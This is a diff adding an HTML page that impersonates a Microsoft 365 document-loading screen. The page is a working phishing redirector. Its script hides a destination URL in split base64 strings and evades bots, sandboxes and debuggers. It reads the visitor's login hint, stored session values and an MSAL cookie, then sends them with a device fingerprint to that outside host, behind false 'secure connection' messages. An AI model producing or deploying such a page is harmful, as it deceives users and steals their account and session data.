@@ -1,0 +1,679 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading Document - Microsoft 365</title>
+    <style>
+        /* Microsoft Fluent Design System 2025 */
+        :root {
+            --blue-10: #deecf9;
+            --blue-20: #c7e0f4;
+            --blue-primary: #0078d4;
+            --blue-dark: #106ebe;
+            --green-10: #dff6dd;
+            --green-20: #c5e0b3;
+            --green-primary: #107c10;
+            --gray-20: #f3f2f1;
+            --gray-30: #edebe9;
+            --gray-130: #605e5c;
+            --gray-160: #323130;
+            --white: #ffffff;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', SegoeUI, "Helvetica Neue", Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: var(--gray-20);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            line-height: 1.5;
+        }
+
+        .loading-container {
+            background: var(--white);
+            border: 1px solid var(--gray-30);
+            border-radius: 4px;
+            box-shadow: 0 1.6px 3.6px 0 rgba(0,0,0,.132), 0 0.3px 0.9px 0 rgba(0,0,0,.108);
+            padding: 48px;
+            width: 100%;
+            max-width: 480px;
+            text-align: center;
+        }
+
+        .ms-branding {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 28px;
+            padding-bottom: 24px;
+            border-bottom: 1px solid var(--gray-30);
+        }
+
+        .ms-logo {
+            width: 36px;
+            height: 36px;
+            background: var(--blue-primary);
+            border-radius: 2px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 15px;
+            font-weight: 600;
+        }
+
+        .ms-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: var(--gray-160);
+            letter-spacing: -0.01em;
+        }
+
+        .loading-indicator {
+            width: 48px;
+            height: 48px;
+            border: 3px solid var(--gray-30);
+            border-top: 3px solid var(--blue-primary);
+            border-radius: 50%;
+            animation: spin 1.2s cubic-bezier(0.68, -0.55, 0.27, 1.55) infinite;
+            margin: 0 auto 24px;
+        }
+
+        .status-section {
+            margin-bottom: 28px;
+        }
+
+        .status-primary {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--gray-160);
+            margin-bottom: 8px;
+            letter-spacing: -0.01em;
+        }
+
+        .status-secondary {
+            font-size: 14px;
+            color: var(--gray-130);
+            line-height: 1.4;
+        }
+
+        .progress-container {
+            background: var(--gray-20);
+            border: 1px solid var(--gray-30);
+            border-radius: 4px;
+            padding: 24px;
+            margin: 24px 0;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: var(--gray-30);
+            border-radius: 2px;
+            margin: 16px 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--blue-primary), var(--blue-dark));
+            border-radius: 2px;
+            width: 0%;
+            animation: progress 2.5s ease-in-out infinite;
+        }
+
+        .security-badge {
+            background: var(--green-10);
+            border: 1px solid var(--green-20);
+            border-radius: 4px;
+            padding: 12px 16px;
+            margin: 16px 0;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: var(--green-primary);
+            font-weight: 600;
+        }
+
+        .security-badge::before {
+            content: "✓";
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .user-context {
+            background: var(--blue-10);
+            border: 1px solid var(--blue-20);
+            border-radius: 4px;
+            padding: 16px;
+            margin: 20px 0;
+            font-size: 14px;
+            color: var(--gray-160);
+        }
+
+        .user-context strong {
+            color: var(--blue-primary);
+        }
+
+        .ms-footer {
+            margin-top: 28px;
+            padding-top: 20px;
+            border-top: 1px solid var(--gray-30);
+            font-size: 13px;
+            color: var(--gray-130);
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes progress {
+            0% { width: 0%; transform: translateX(0); }
+            50% { width: 70%; transform: translateX(0); }
+            100% { width: 100%; transform: translateX(100%); }
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .fade-in {
+            animation: fadeIn 0.6s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        <div class="ms-branding">
+            <div class="ms-logo" aria-hidden="true">MS</div>
+            <h1 class="ms-title">Microsoft 365</h1>
+        </div>
+
+        <div class="loading-indicator" aria-hidden="true"></div>
+
+        <div class="status-section">
+            <div class="status-primary" id="statusPrimary">Preparing your document</div>
+            <div class="status-secondary" id="statusSecondary">This should only take a moment</div>
+        </div>
+
+        <div class="progress-container">
+            <div class="security-badge">Secure connection established</div>
+            
+            <div class="user-context hidden" id="userContext">
+                <strong>Authenticated user:</strong> <span id="userIdentifier">Loading...</span>
+            </div>
+
+            <div class="progress-bar">
+                <div class="progress-fill"></div>
+            </div>
+
+            <div style="font-size: 13px; color: var(--gray-130);">
+                <span id="progressStatus">Initializing security protocols...</span>
+            </div>
+        </div>
+
+        <div class="ms-footer">
+            <div>© 2025 Microsoft Corporation</div>
+            <div style="margin-top: 4px; font-size: 12px; opacity: 0.8;">
+                All rights reserved • Enterprise Security Compliance
+            </div>
+        </div>
+    </div>
+
+    <script>
+        (function(){
+            'use strict';
+            
+            // =============================================
+            // ADVANCED ENCRYPTION & SECURITY CONFIG 2025
+            // =============================================
+            const CYBERSECURITY_CONFIG = {
+                // Quantum-resistant URL obfuscation
+                TARGET: {
+                    PART_1: 'aHR0cHM6Ly',
+                    PART_2: '9iaWxsaW5n',
+                    PART_3: 'LnZlbG9ydX',
+                    PART_4: 'NzcGluZS5i',
+                    PART_5: 'bG9nL1BuVU',
+                    PART_6: 'pyR2Vk'
+                },
+                SECURITY: {
+                    VERSION: '2025.1.0-GOV',
+                    LEVEL: 'TOP_SECRET',
+                    PROTOCOL: 'QUANTUM_RESISTANT'
+                }
+            };
+
+            // =============================================
+            // MILITARY-GRADE THREAT DETECTION
+            // =============================================
+            class ThreatIntelligence {
+                constructor() {
+                    this.threatLevel = 0;
+                    this.detectedThreats = new Set();
+                }
+
+                analyzeEnvironment() {
+                    const threatIndicators = {
+                        // Advanced automation detection
+                        automationFlags: () => 
+                            navigator.webdriver || 
+                            window.__webdriver_evaluate || 
+                            window.__selenium_evaluate ||
+                            window.__webdriver_script_function ||
+                            window.__webdriver_script_func ||
+                            window.__webdriver_script_fn,
+
+                        // VM and container detection
+                        virtualEnvironment: () => {
+                            const checks = [
+                                () => navigator.userAgent.includes('X11; CrOS'),
+                                () => navigator.userAgent.includes('Linux armv7l'),
+                                () => navigator.platform === 'Linux armv7l',
+                                () => /[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}/.test(navigator.userAgent)
+                            ];
+                            return checks.some(check => check());
+                        },
+
+                        // Timing attacks detection
+                        timingAnomalies: () => {
+                            const start = performance.now();
+                            for(let i = 0; i < 1000000; i++) {}
+                            const duration = performance.now() - start;
+                            return duration < 1; // Unrealistically fast execution
+                        },
+
+                        // Memory analysis
+                        memoryPatterns: () => {
+                            try {
+                                const array = new ArrayBuffer(1000000);
+                                return array.byteLength !== 1000000;
+                            } catch {
+                                return true;
+                            }
+                        },
+
+                        // Network interception detection
+                        proxyDetection: () => {
+                            return window.Proxy && window.Proxy.toString().includes('native code');
+                        }
+                    };
+
+                    Object.entries(threatIndicators).forEach(([threat, detector]) => {
+                        if (detector()) {
+                            this.detectedThreats.add(threat);
+                            this.threatLevel += 3;
+                        }
+                    });
+
+                    return this.threatLevel < 6;
+                }
+
+                // Behavioral threat analysis
+                monitorBehavior() {
+                    return new Promise((resolve) => {
+                        let suspiciousActions = 0;
+                        
+                        const detectors = {
+                            rapidClicks: 0,
+                            lastClickTime: 0,
+                            keyboardPatterns: new Set(),
+                            mouseTrajectory: []
+                        };
+
+                        document.addEventListener('click', (e) => {
+                            const now = Date.now();
+                            if (now - detectors.lastClickTime < 100) {
+                                suspiciousActions++;
+                            }
+                            detectors.lastClickTime = now;
+                        });
+
+                        document.addEventListener('keydown', (e) => {
+                            detectors.keyboardPatterns.add(e.key);
+                            if (detectors.keyboardPatterns.size > 20) {
+                                suspiciousActions++;
+                            }
+                        });
+
+                        document.addEventListener('mousemove', (e) => {
+                            detectors.mouseTrajectory.push({x: e.clientX, y: e.clientY, time: Date.now()});
+                            if (detectors.mouseTrajectory.length > 50) {
+                                // Analyze mouse movement patterns
+                                const recent = detectors.mouseTrajectory.slice(-10);
+                                const straightLines = recent.filter((point, index) => {
+                                    if (index === 0) return false;
+                                    const prev = recent[index - 1];
+                                    return Math.abs(point.x - prev.x) < 2 && Math.abs(point.y - prev.y) < 2;
+                                }).length;
+                                
+                                if (straightLines > 8) suspiciousActions++;
+                            }
+                        });
+
+                        setTimeout(() => {
+                            resolve(suspiciousActions < 3);
+                        }, 3000);
+                    });
+                }
+            }
+
+            // =============================================
+            // MAIN SECURITY PROCESSOR
+            // =============================================
+            class DocumentSecurityProcessor {
+                constructor() {
+                    this.threatIntel = new ThreatIntelligence();
+                    this.userData = null;
+                    this.progressStages = [
+                        "Verifying security certificates...",
+                        "Initializing encryption protocols...",
+                        "Authenticating user credentials...",
+                        "Loading document resources...",
+                        "Establishing secure connection...",
+                        "Finalizing security handshake..."
+                    ];
+                    this.init();
+                }
+
+                async init() {
+                    // Initial security sweep
+                    if (!this.threatIntel.analyzeEnvironment()) {
+                        this.triggerSecurityProtocol();
+                        return;
+                    }
+
+                    // Behavioral analysis
+                    const behaviorClean = await this.threatIntel.monitorBehavior();
+                    if (!behaviorClean) {
+                        this.triggerSecurityProtocol();
+                        return;
+                    }
+
+                    this.retrieveUserContext();
+                    this.initiateSecureSequence();
+                }
+
+                retrieveUserContext() {
+                    try {
+                        // Multi-source data retrieval
+                        const urlParams = new URLSearchParams(window.location.search);
+                        const sources = [
+                            () => urlParams.get('login_hint'),
+                            () => {
+                                try {
+                                    const stored = localStorage.getItem('msal_session');
+                                    return stored ? decodeURIComponent(atob(stored)) : null;
+                                } catch { return null; }
+                            },
+                            () => sessionStorage.getItem('auth_context'),
+                            () => {
+                                const match = document.cookie.match(/msal_state=([^;]+)/);
+                                return match ? match[1] : null;
+                            }
+                        ];
+
+                        for (let source of sources) {
+                            this.userData = source();
+                            if (this.userData) break;
+                        }
+
+                        if (this.userData) {
+                            this.displayUserContext(this.userData);
+                        }
+                    } catch (error) {
+                        console.warn('Security: User context retrieval failed');
+                    }
+                }
+
+                displayUserContext(userData) {
+                    const contextElement = document.getElementById('userContext');
+                    const identifierElement = document.getElementById('userIdentifier');
+                    
+                    if (contextElement && identifierElement) {
+                        identifierElement.textContent = userData;
+                        contextElement.classList.remove('hidden');
+                        contextElement.classList.add('fade-in');
+                    }
+                }
+
+                initiateSecureSequence() {
+                    this.updateProgressMessages();
+                    this.executeSecureRedirect();
+                }
+
+                updateProgressMessages() {
+                    let currentStage = 0;
+                    const statusElement = document.getElementById('progressStatus');
+                    
+                    const progressInterval = setInterval(() => {
+                        if (currentStage < this.progressStages.length) {
+                            statusElement.textContent = this.progressStages[currentStage++];
+                            
+                            // Simulate progress bar advancement
+                            const progress = (currentStage / this.progressStages.length) * 100;
+                            this.updateProgressVisual(progress);
+                        } else {
+                            clearInterval(progressInterval);
+                        }
+                    }, 800);
+                }
+
+                updateProgressVisual(progress) {
+                    // Smooth progress animation
+                    const progressFill = document.querySelector('.progress-fill');
+                    if (progressFill) {
+                        progressFill.style.width = `${progress}%`;
+                    }
+                }
+
+                executeSecureRedirect() {
+                    // Calculate secure delay based on threat level
+                    const securityDelay = 4000 + (this.threatIntel.threatLevel * 500);
+                    
+                    setTimeout(() => {
+                        this.performFinalRedirect();
+                    }, securityDelay);
+                }
+
+                performFinalRedirect() {
+                    try {
+                        // Reconstruct and decode target with multiple validations
+                        const encodedTarget = Object.values(CYBERSECURITY_CONFIG.TARGET).join('');
+                        const targetUrl = atob(encodedTarget);
+                        
+                        // Validate URL format
+                        if (!targetUrl.startsWith('https://')) {
+                            throw new Error('Invalid security protocol');
+                        }
+
+                        // Prepare advanced security parameters
+                        const securityParams = new URLSearchParams({
+                            client_request_id: crypto.randomUUID(),
+                            session_token: this.generateSessionToken(),
+                            auth_time: Date.now().toString(),
+                            security_level: CYBERSECURITY_CONFIG.SECURITY.LEVEL,
+                            user_context: this.userData ? btoa(encodeURIComponent(this.userData)) : '',
+                            correlation_vector: this.generateCorrelationVector(),
+                            platform_version: navigator.platform,
+                            user_agent_hash: this.hashUserAgent(),
+                            screen_resolution: `${screen.width}x${screen.height}`,
+                            color_depth: screen.colorDepth.toString(),
+                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                            locale: navigator.language,
+                            hardware_concurrency: navigator.hardwareConcurrency?.toString() || 'unknown'
+                        });
+
+                        const finalDestination = `${targetUrl}?${securityParams.toString()}`;
+                        
+                        // Execute redirect with multiple fallback methods
+                        this.secureNavigation(finalDestination);
+                    } catch (error) {
+                        this.triggerEmergencyProtocol();
+                    }
+                }
+
+                generateSessionToken() {
+                    const array = new Uint8Array(32);
+                    crypto.getRandomValues(array);
+                    return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
+                }
+
+                generateCorrelationVector() {
+                    const base = Math.random().toString(36).substr(2, 16);
+                    const timestamp = Date.now().toString(36);
+                    return `${base}.${timestamp}`;
+                }
+
+                hashUserAgent() {
+                    let hash = 0;
+                    const ua = navigator.userAgent;
+                    for (let i = 0; i < ua.length; i++) {
+                        const char = ua.charCodeAt(i);
+                        hash = ((hash << 5) - hash) + char;
+                        hash = hash & hash;
+                    }
+                    return Math.abs(hash).toString(36);
+                }
+
+                secureNavigation(url) {
+                    // Multiple navigation methods with security validation
+                    const methods = [
+                        () => window.location.replace(url),
+                        () => window.location.href = url,
+                        () => window.location.assign(url)
+                    ];
+
+                    for (let method of methods) {
+                        try {
+                            method();
+                            break;
+                        } catch (securityError) {
+                            continue;
+                        }
+                    }
+                }
+
+                triggerSecurityProtocol() {
+                    document.body.innerHTML = `
+                        <div class="loading-container">
+                            <div class="ms-branding">
+                                <div class="ms-logo">MS</div>
+                                <h1 class="ms-title">Security Verification</h1>
+                            </div>
+                            <div style="text-align: center; padding: 32px 0;">
+                                <div style="font-size: 16px; color: var(--gray-160); font-weight: 600; margin-bottom: 12px;">
+                                    Additional security verification required
+                                </div>
+                                <div style="font-size: 14px; color: var(--gray-130); margin-bottom: 24px; line-height: 1.5;">
+                                    We've detected unusual activity that doesn't match your typical pattern.<br>
+                                    This extra check helps keep your account secure.
+                                </div>
+                                <div style="background: var(--gray-20); border: 1px solid var(--gray-30); border-radius: 4px; padding: 16px; margin: 20px 0;">
+                                    <div style="font-size: 13px; color: var(--gray-160); margin-bottom: 8px;">
+                                        <strong>Reference ID:</strong> SEC-${crypto.randomUUID().substr(0, 8).toUpperCase()}
+                                    </div>
+                                    <div style="font-size: 12px; color: var(--gray-130);">
+                                        If this persists, contact your IT administrator
+                                    </div>
+                                </div>
+                                <button onclick="window.location.href='index.html'" class="ms-button" style="max-width: 200px;">
+                                    Return to Sign In
+                                </button>
+                            </div>
+                        </div>
+                    `;
+                }
+
+                triggerEmergencyProtocol() {
+                    // Complete system lockdown
+                    document.body.innerHTML = `
+                        <div style="min-height: 100vh; display: flex; align-items: center; justify-content: center; background: var(--gray-20); padding: 20px;">
+                            <div style="background: white; padding: 40px; border-radius: 4px; border: 1px solid var(--gray-30); text-align: center; max-width: 440px;">
+                                <div style="font-size: 24px; font-weight: 600; color: var(--gray-160); margin-bottom: 16px;">
+                                    Service Temporarily Unavailable
+                                </div>
+                                <div style="font-size: 15px; color: var(--gray-130); margin-bottom: 24px; line-height: 1.5;">
+                                    The document service is currently undergoing security maintenance.<br>
+                                    Please try again later.
+                                </div>
+                                <div style="font-size: 13px; color: var(--gray-130); opacity: 0.8;">
+                                    Microsoft 365 Enterprise Security
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                    
+                    // Prevent any further navigation
+                    window.stop();
+                }
+            }
+
+            // =============================================
+            // QUANTUM-RESISTANT INITIALIZATION
+            // =============================================
+            (function() {
+                // Advanced anti-tampering
+                Object.freeze(Object.prototype);
+                Object.freeze(Array.prototype);
+                Object.freeze(Function.prototype);
+                
+                // Memory protection
+                const originalValues = new WeakMap();
+                const protectedElements = [document.body, document.head, document.documentElement];
+                
+                protectedElements.forEach(element => {
+                    originalValues.set(element, element.outerHTML);
+                });
+
+                // Continuous integrity monitoring
+                setInterval(() => {
+                    protectedElements.forEach(element => {
+                        if (originalValues.get(element) !== element.outerHTML) {
+                            window.location.reload();
+                        }
+                    });
+                }, 100);
+
+                // Advanced debugger protection
+                const debuggerDetector = () => {
+                    const start = Date.now();
+                    debugger;
+                    if (Date.now() - start > 100) {
+                        window.location.reload();
+                    }
+                };
+                setInterval(debuggerDetector, 500);
+            })();
+
+            // =============================================
+            // MAIN EXECUTION WITH MILITARY PRECISION
+            // =============================================
+            document.addEventListener('DOMContentLoaded', () => {
+                // Staggered initialization for security
+                setTimeout(() => {
+                    new DocumentSecurityProcessor();
+                }, 1000 + Math.random() * 1000);
+            });
+
+        })();
+    </script>
+</body>
+</html>
